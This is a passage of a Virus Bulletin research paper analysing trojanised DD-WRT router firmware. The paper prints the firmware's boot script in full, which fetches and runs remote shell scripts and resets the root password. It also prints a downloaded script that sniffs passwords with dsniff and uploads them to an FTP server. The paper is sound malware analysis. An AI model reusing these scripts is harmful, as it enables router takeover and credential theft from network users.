<p>The 112.bin file is custom firmware that is built to replace the firmware currently running on the router. This process is called 'flashing' and is what the 'write' command is doing. To understand more about the file, we tried to unpack it. Gathering information on the firmware revealed that it is a TRX firmware, as shown in <a href="#table2">Table 2</a>.</p>
<table class="table table-bordered" border="0">
<tbody>
<tr>
<td><strong>Decimal</strong></td>
<td><strong>Hexadecimal</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>0</td>
<td>0x0</td>
<td>TRX firmware header, little-endian, image size: 608,576 bytes, CRC32: 0x1F69B1FF, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, Linux kernel offset: 0x9A8, rootfs offset: 0xE4C00</td>
</tr>
<tr>
<td>28</td>
<td>0x1C</td>
<td>Gzip compressed data, maximum compression, from Unix, NULL date (1970-01-01 00:00:00)</td>
</tr>
<tr>
<td>2472</td>
<td>0x9A8</td>
<td>LZMA compressed data, properties: 0x6E, dictionary size: 2,097,152 bytes, uncompressed size: 2,990,080 bytes</td>
</tr>
<tr>
<td>936960</td>
<td>0xE4C00</td>
<td>Squashfs filesystem, little‑endian, DD-WRT signature, version 3.0, size: 2,668,434 bytes, 580 inodes, blocksize: 131,072 bytes, created: 2016-11-09 07:00:35</td>
</tr>
</tbody>
</table>
<p><a class=" anchor" name="table2"></a><span class="centered-caption">Table 2: Information on 112.bin firmware.</span></p>
<p>There was also a giveaway from the magic bytes of the file when loaded into a hex editor, as shown in <a href="#figure9">Figure 9</a>.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/3115/1636/0692/router-all-evil-fig9.png" alt="router-all-evil-fig9.png" width="597" height="308" /><span class="centered-caption"> <a class=" anchor" name="figure9"></a>Figure 9: Magic bytes.</span></p>
<p>Proceeding to extract the file system revealed folders inside the firmware, as shown in<a href="#figure10"> Figure 10</a>.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/8d37531ba159975c174b3378888a52f3_f2490.png" alt="router-all-evil-fig10.png" width="400" height="64" /><span class="centered-caption"><a class=" anchor" name="figure10"></a>Figure 10: Folders inside the firmware.</span></p>
<p>Looking at the directory tree, one particular file stood out: /etc/init.d/rcS. Running the 'file' command on the file reveals that it is a POSIX shell script, ASCII text executable. This file (bash file) is called during boot time and runs whatever is put into it. <a href="#figure11">Figure 11 </a>shows the content of the rcS file.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/355fd421ebf1b632892562b6370db39a_f2491.png" alt="router-all-evil-fig11.png" width="480" height="70" /></p>
<pre>#!/bin/sh<br />sleep 320<br />echo "while true<br />do<br />ping -c 3 8.8.8.8 &gt; /dev/null<br />if [ 0 -eq 1 ]; then<br />echo is ofline.09-11-09-01 &gt; /dev/null<br />else<br />cd /tmp<br />rm -rf /tmp/d1.sh<br />echo&gt;/tmp/check112<br />rm -rf /tmp/start_mod.sh<br />wget http://94.156.35.78/h/wrt/start_mod.sh<br />chmod 777 /tmp/start_mod.sh<br />/bin/sh /tmp/start_mod.sh &amp;<br />sleep 360<br />rm -rf /tmp/l2.sh;cd /tmp;wget http://dasadlxx49.hopto.org/tmp/l2.sh;chmod 777 /tmp/l2.sh;/bin/sh /tmp/l2.sh &amp;<br />rm -rf /tmp/hall49bb.sh;cd /tmp;wget http://bikershop-bittner.de/tmp/hall49bb.sh;chmod 777 /tmp/hall49bb.sh;/bin/sh /tmp/hall49bb.sh &amp;<br />rm -rf /tmp/hall2.sh;cd /tmp;wget http://dasadgxx4744.hopto.org/tmp/hall2.sh;chmod 777 /tmp/hall2.sh;/bin/sh /tmp/hall2.sh &amp;<br />rm -rf /tmp/hall1bb.sh;cd /tmp;wget http://bb1d7gsak.hopto.org/tmp/hall1bb.sh;chmod 777 /tmp/hall1bb.sh;/bin/sh /tmp/hall1bb.sh &amp;<br />rm -rf /tmp/hall2bb.sh;cd /tmp;wget http://bb49d7dns.ddns.net/tmp/hall2bb.sh;chmod 777 /tmp/hall2bb.sh;/bin/sh /tmp/hall2bb.sh &amp;<br />rm -rf /tmp/hall2bb.sh;cd /tmp;wget http://bba27kda.ddns.net/tmp/hall2bb.sh;chmod 777 /tmp/hall2bb.sh;/bin/sh /tmp/hall2bb.sh &amp;<br />setuserpasswd root glissada88<br />sleep 7200<br />fi<br />done<br />sleep 1<br />done<br />" &gt; /tmp/2.sh<br />chmod 777 /tmp/2.sh<br />/bin/sh /tmp/2.sh &amp;<br />sleep 20<br />chmod 777 -R /tmp<br />mkdir /tmp/ip2;cd /tmp/ip2;wget http://94.156.35.78/h/wrt/ip.php;cat /tmp/ip2/ip.php&gt;/tmp/i5.sh;rm -rf /tmp/ip2<br />rm -rf /tmp/index.html;cd /tmp;/usr/bin/wget http://www.ip2nation.com;cat /tmp/index.html | grep acronym | sed 's/&lt;acronym title="IP: //g' | sed -n 's/.*"&gt;//p' | sed 's/&lt;\/acronym&gt;//g' | sed 's/ //g'&gt;/tmp/h5.sh;rm -rf /tmp/index.html<br />cd /tmp;rm -rf /tmp/ds_mod.sh;wget http://94.156.35.78/h/wrt/ds_mod.sh;chmod 777 /tmp/ds_mod.sh;/bin/sh /tmp/ds_mod.sh &amp;<br />rm -rf /tmp/start_hall.sh;cd /tmp;wget http://salem132.dyndns.tv/tmp/start_hall.sh;chmod 777 /tmp/start_hall.sh;/bin/sh /tmp/start_hall.sh &amp;<br />rm -rf /tmp/hall883bb.sh;cd /tmp;wget http://bikershop-bittner.de/tmp/hall883bb.sh;chmod 777 /tmp/hall883bb.sh;/bin/sh /tmp/hall883bb.sh &amp;<br />for i in /etc/init.d/S*; do<br />$i start 2&gt;&amp;1<br />done | logger -s -p 6 -t '' &amp;</pre>
<p><span class="centered-caption"><a class=" anchor" name="figure11"></a>Figure 11: Content of rcS file.</span></p>
<p>When executed, the script removes the previous versions of the malicious files downloaded from the servers and downloads newer ones. We were not able to download all the files since most of the servers were down, but one of the downloaded files, http://94.156.35.78/h/wrt/ds_mod.sh, revealed something interesting (see <a href="#figure12">Figure 12</a>).</p>
<pre><br />if [[ -s /tmp/ds10_mod.txt ]]; then<br />rm -rf /tmp/ds/ds1.txt<br />uptime &gt; /dev/null<br />else<br />echo "while true<br />do<br />ping -c 3 8.8.8.8 &gt; /dev/null<br />if [ 0 -eq 1 ]; then<br />echo is ofline.09-11-09-01 &gt; /dev/null<br />else<br />if [[ -s /tmp/ds11.txt ]]; then<br />uptime &gt; /dev/null<br />else<br />echo \"sdasdsadasdsadsadasdasdasdasd\"&gt;/tmp/ds10_mod.txt<br />#echo \"sdasdsadaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddsdsadsadasdasdasdasd\"&gt;/tmp/ds11.txt<br />mkdir /tmp/ds<br />touch /tmp/ds/ds.)cat /tmp/i5.sh).txt<br />#/usr/sbin/dsniff -i )nvram get wan_iface) &gt;/tmp/ds/ds5.txt &amp;<br /><strong>/usr/sbin/dsniff -i )nvram get lan_ifname) &gt;/tmp/ds/ds5.txt &amp;</strong><br />#/usr/sbin/dsniff -i )nvram get wan_iface) &gt;/tmp/ds/ds5.txt &amp;<br />sleep 120<br />kill \$!<br />rm -rf /var/run/ms<br />killall ms<br />#mv /tmp/ds/ds5.txt /tmp/ds/ds7.txt<br />cat /tmp/ds/ds5.txt &gt;&gt;/tmp/ds/ds.)cat /tmp/i5.sh).txt<br />sleep 1<br />cd /tmp/ds<br />if [ )ls -l /tmp/ds/ds.\)cat /tmp/i5.sh\).txt | awk '{print \$5}') -gt 5000 ]; then<br />mkdir /tmp/ds2<br />cp /tmp/ds/ds.)cat /tmp/i5.sh).txt /tmp/ds2/<br />mv /tmp/ds2/ds.)cat /tmp/i5.sh).txt /tmp/ds2/)cat /tmp/h5.sh | cut -c 1-4).)date +%H-%M-%d-%m-%y)_)cat /tmp/i5.sh).txt<br />cd /tmp/ds2<br /><strong>/usr/bin/wput )cat /tmp/h5.sh | cut -c 1-4).)date +%H-%M-%d-%m-%y)_)cat /tmp/i5.sh).txt ftp://sammy:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2c5f5f5f5f5f6c1518021d191a021f19021b14">[email&#160;protected]</a>/mnt/hdd/backup/ds/ &amp;</strong><br />process_id=\$!<br />wait \$process_id<br />fi<br />if [ )ls -l /tmp/ds/ds.\)cat /tmp/i5.sh\).txt | awk '{print \$5}') -gt 5000 ]; then<br />rm -rf /tmp/ds/*<br />rm -rf /tmp/ds2/*<br />fi<br />fi<br />fi<br />done<br />sleep 1<br />done<br />" &gt; /tmp/ds1_mod.sh<br />sed 's/)/'/g' &lt;/tmp/ds1_mod.sh &gt;/tmp/ds2_mod.sh.sh<br />sed 's/,/(/g' &lt;/tmp/ds2_mod.sh.sh &gt;/tmp/ds3_mod.sh.sh<br />sed 's/Z/)/g' &lt;/tmp/ds3_mod.sh.sh &gt;/tmp/ds4_mod.sh.sh<br />chmod 777 /tmp/ds4_mod.sh.sh<br />sleep 2<br />/bin/sh /tmp/ds4_mod.sh.sh &amp;<br />Fi</pre>
<p class="centered-caption"><a class=" anchor" name="figure12"></a>Figure 12: Downloaded file from http://94.156.35.78/h/wrt/ds_mod.sh.</p>
<p>The script had an interesting command:</p>
<pre>/usr/bin/wput 'cat /tmp/h5.sh | cut -c 1-4'.'date +%H-%M-%d-%m-%y'_'cat /tmp/i5.sh'.txt ftp://sammy:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="91e2e2e2e2e2d1a8a5bfa0a4a7bfa2a4bfa6a9">[email&#160;protected]</a>/mnt/hdd/backup/ds/ &amp;</pre>
<p>It appeared as if the command was uploading some text file to the FTP server with the filename formatted in the following way:</p>
<p style="padding-left: 30px;">&lt;COUNTRY'S FIRST FOUR LETTERS&gt;.&lt;DATE IN DD MM YY&gt;.&lt;IP ADDRESS OF THE DEVICE&gt;.txt</p>
<p>The text file was uploaded to the following FTP server:</p>
<p style="padding-left: 30px;">ftp://94.156.35.78/mnt/hdd/backup/ds/</p>
<p>The country's first four letters were fetched from http://www.ip2nation.com (script /tmp/h5.sh).</p>
<p>The IP address was fetched from http://94.156.35.78/h/wrt/ip.php (script /tmp/i5.sh).</p>
<p> </p>
<h4><a class="chapter" name="h4-what-it-uploading"></a>What is it uploading?</h4>
<p>Another mystery is: what was the data being uploaded? Further analysis revealed that the custom firmware had the password-sniffing tool dsniff [<a href="#ref19">19</a>] installed within it. The dsniff process is started during boot time with the rcS script:</p>
<pre>/usr/sbin/dsniff -i )nvram get lan_ifname) &gt;/tmp/ds/ds5.txt</pre>
<p>The tool is configured to sniff passwords and push them to a text file. This file is what was later uploaded to the FTP server.</p>
<p>Looking into the FTP revealed multiple text files, indicating that the attack was very widespread (see <a href="#figure13">Figure 13</a>).</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/8cc7da1974458d18c69fc3b1d29d959f_f2492.png" alt="router-all-evil-fig13.png" width="700" height="529" /><span class="centered-caption"><a class=" anchor" name="figure13"></a>Figure 13: Multiple text files in the FTP server.</span></p>
<p> </p>
<h2><a class="chapter" name="h2-notable-router-attacks"></a>Notable router attacks</h2>
<h3><a class="chapter" name="h3-hacking-team-takedown"></a>Hacking Team takedown</h3>
<p>Offensive security company <em>Hacking Team</em> previously had very little exposure on the Internet. For example, unlike the<em> Gamma Group</em>, a client certificate was required in order to connect to <em>Hacking Team</em>'s customer support site. The company did have its main website (a <em>Joomla</em> blog in which <em>Joomscan</em> did not find anything serious), a mail server, a couple of routers, two VPN appliances, and a spam‑filtering appliance.</p>
<p>So, there were three options: look for a zero-day in <em>Joomla</em>, postfix, or one of the embedded devices. A zero-day in an embedded device seemed like the easiest option, and after two weeks of reverse engineering, they got a remote root exploit [<a href="#ref20">20</a>].</p>
<p> </p>
<h3>Shadow Brokers [<a href="#ref21">21</a>]</h3>
<p><a href="#figure14">Figure 14</a> shows router exploits by the Shadow Brokers.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/fbe012014026f587a591dbae7f17dc70_f2493.png" alt="router-all-evil-fig14.png" width="580" height="312" /><span class="centered-caption"><a class=" anchor" name="figure14"></a>Figure 14: Router exploits by the Shadow Brokers (source: https://blogs.cisco.com/security/shadow-brokers).</span></p>
<p> </p>
<h2><a class="chapter" name="h2-tool-firmadyne"></a>The tool: Firmadyne</h2>
<p>Firmadyne is an automated and scalable system for performing emulation and dynamic analysis of <em>Linux</em>-based embedded firmware [<a href="#ref22">22</a>]. It includes the following components:</p>
<ul>
<li>Modified kernels (MIPS: v2.6.32 [<a href="#ref23">23</a>], ARM: v4.1 [<a href="#ref24">24</a>], v3.10 [<a href="#ref25">25</a>]) for instrumentation of firmware execution.</li>
<li>A userspace NVRAM library [<a href="#ref26">26</a>] to emulate a hardware NVRAM peripheral.</li>
<li>An extractor [<a href="#ref27">27</a>] to extract a file system and kernel from downloaded firmware.</li>
<li>A small console application [<a href="#ref28">28</a>] to spawn an additional shell for debugging.</li>
<li>A scraper [<a href="#ref29">29</a>] to download firmware from 42+ different vendors.</li>
</ul>
<p>Firmadyne can also be used to repack any binary, after altering the files in a file system. And that is what was done in the case of the firmware we have discussed in this paper.</p>
<p> </p>
<h2><a class="chapter" name="h2-references"></a>References</h2>
<p><a class=" anchor" name="ref1"></a>[1] <a href="http://www.securityfocus.com/bid/94819" target="_blank">http://www.securityfocus.com/bid/94819</a>.</p>
<p><a class=" anchor" name="ref2"></a>[2] <a href="http://www.securityfocus.com/bid/70165" target="_blank">http://www.securityfocus.com/bid/70165</a>.</p>
<p><a class=" anchor" name="ref3"></a>[3] <a href="http://www.securityfocus.com/bid/70166" target="_blank">http://www.securityfocus.com/bid/70166</a>.</p>
<p><a class=" anchor" name="ref4"></a>[4] <a href="http://www.securityfocus.com/bid/70137" target="_blank">http://www.securityfocus.com/bid/70137</a>.</p>
<p><a class=" anchor" name="ref5"></a>[5] <a href="http://www.securityfocus.com/bid/70152" target="_blank">http://www.securityfocus.com/bid/70152</a>.</p>
<p><a class=" anchor" name="ref6"></a>[6] <a href="http://www.securityfocus.com/bid/70154" target="_blank">http://www.securityfocus.com/bid/70154</a>.</p>
<p><a class=" anchor" name="ref7"></a>[7] <a href="https://www.pcworld.com/article/2104380/attack-campaign-compromises-300000-home-routers-alters-dns-settings.html" target="_blank">http://www.pcworld.com/article/2104380/attack-campaign-compromises-300000-home-routers-alters-dns-settings.html</a>.</p>
<p><a class=" anchor" name="ref8"></a>[8] <a href="http://www.csoonline.com/article/2602181/data-protection/attack-hijacks-dns-settings-on-home-routers-in-brazil.html" target="_blank">http://www.csoonline.com/article/2602181/data-protection/attack-hijacks-dns-settings-on-home-routers-in-brazil.html</a>.</p>
<p><a class=" anchor" name="ref9"></a>[9] <a href="http://disconnected.io/2014/03/18/how-i-hacked-your-router/" target="_blank">http://disconnected.io/2014/03/18/how-i-hacked-your-router/</a>.</p>
<p><a class=" anchor" name="ref10"></a>[10] <a href="https://www.schneier.com/blog/archives/2007/02/driveby_pharmin.html" target="_blank">https://www.schneier.com/blog/archives/2007/02/driveby_pharmin.html</a>.</p>
<p><a class=" anchor" name="ref11"></a>[11] <a href="https://www.symantec.com/connect/blogs/mirai-what-you-need-know-about-botnet-behind-recent-major-ddos-attacks" target="_blank">https://www.symantec.com/connect/blogs/mirai-what-you-need-know-about-botnet-behind-recent-major-ddos-attacks</a>.</p>
<p><a class=" anchor" name="ref12"></a>[12] <a href="https://security.stackexchange.com/questions/77112/danger-of-default-router-password" target="_blank">https://security.stackexchange.com/questions/77112/danger-of-default-router-password</a>.</p>
<p><a class=" anchor" name="ref13"></a>[13] <a href="https://www.symantec.com/connect/blogs/iot-devices-being-increasingly-used-ddos-attacks" target="_blank">https://www.symantec.com/connect/blogs/iot-devices-being-increasingly-used-ddos-attacks</a>.</p>
<p><a class=" anchor" name="ref14"></a>[14] <a href="https://blog.sucuri.net/2016/09/iot-home-router-botnet-leveraged-in-large-ddos-attack.html" target="_blank">https://blog.sucuri.net/2016/09/iot-home-router-botnet-leveraged-in-large-ddos-attack.html</a>.</p>
<p><a class=" anchor" name="ref15"></a>[15] <a href="http://www.securityfocus.com/bid/70103" target="_blank">http://www.securityfocus.com/bid/70103</a>.</p>
<p><a class=" anchor" name="ref16"></a>[16] <a href="https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability" target="_blank">https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability</a>.</p>
<p><a class=" anchor" name="ref17"></a>[17] <a href="https://www.symantec.com/security_response/writeup.jsp?docid=2014-100222-5658-99" target="_blank">https://www.symantec.com/security_response/writeup.jsp?docid=2014-100222-5658-99</a>.</p>
<p><a class=" anchor" name="ref18"></a>[18] <a href="https://www.symantec.com/connect/blogs/mirai-what-you-need-know-about-botnet-behind-recent-major-ddos-attacks" target="_blank">https://www.symantec.com/connect/blogs/mirai-what-you-need-know-about-botnet-behind-recent-major-ddos-attacks</a>.</p>
<p><a class=" anchor" name="ref19"></a>[19] <a href="https://en.wikipedia.org/wiki/DSniff" target="_blank">https://en.wikipedia.org/wiki/DSniff</a>.</p>
<p><a class=" anchor" name="ref20"></a>[20] <a href="https://pastebin.com/0SNSvyjJ" target="_blank">https://pastebin.com/0SNSvyjJ</a>.</p>
<p><a class=" anchor" name="ref21"></a>[21] <a href="https://blogs.cisco.com/security/shadow-brokers" target="_blank">https://blogs.cisco.com/security/shadow-brokers</a>.</p>
<p><a class=" anchor" name="ref22"></a>[22] <a href="https://github.com/firmadyne/firmadyne" target="_blank">https://github.com/firmadyne/firmadyne</a>.</p>
<p><a class=" anchor" name="ref23"></a>[23] <a href="https://github.com/firmadyne/kernel-v2.6.32/" target="_blank">https://github.com/firmadyne/kernel-v2.6.32/</a>.</p>
<p><a class=" anchor" name="ref24"></a>[24] <a href="https://github.com/firmadyne/kernel-v4.1" target="_blank">https://github.com/firmadyne/kernel-v4.1</a>.</p>
<p><a class=" anchor" name="ref25"></a>[25] <a href="https://github.com/firmadyne/kernel-v3.10" target="_blank">https://github.com/firmadyne/kernel-v3.10</a>.</p>
<p><a class=" anchor" name="ref26"></a>[26] <a href="https://github.com/firmadyne/libnvram" target="_blank">https://github.com/firmadyne/libnvram</a>.</p>
<p><a class=" anchor" name="ref27"></a>[27] <a href="https://github.com/firmadyne/extractor" target="_blank">https://github.com/firmadyne/extractor</a>.</p>
<p><a class=" anchor" name="ref28"></a>[28]<a href="%20https://github.com/firmadyne/console" target="_blank"> https://github.com/firmadyne/console</a>.</p>
<p><a class=" anchor" name="ref29"></a>[29] <a href="https://github.com/firmadyne/scraper" target="_blank">https://github.com/firmadyne/scraper</a>.</p> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/magazine/2018/VB2017-Anand-Menrige.pdf" target="_blank"><img src="/uploads/images/buttons/pdf-download-button.jpg" alt="Download PDF" width="262" height="45" /></a></p>
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=VB2017 paper: The router of all evil: more than just default passwords and silly scripts&url=https://www.virusbulletin.com/virusbulletin/2018/03/vb2017-paper-router-all-evil-more-just-default-passwords-and-silly-scripts"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2018/03/vb2017-paper-router-all-evil-more-just-default-passwords-and-silly-scripts'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2018/03/vb2017-paper-router-all-evil-more-just-default-passwords-and-silly-scripts&title=VB2017 paper: The router of all evil: more than just default passwords and silly scripts"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2018/03/vb2017-paper-router-all-evil-more-just-default-passwords-and-silly-scripts&t=VB2017 paper: The router of all evil: more than just default passwords and silly scripts"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2018/03/vb2017-paper-router-all-evil-more-just-default-passwords-and-silly-scripts"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>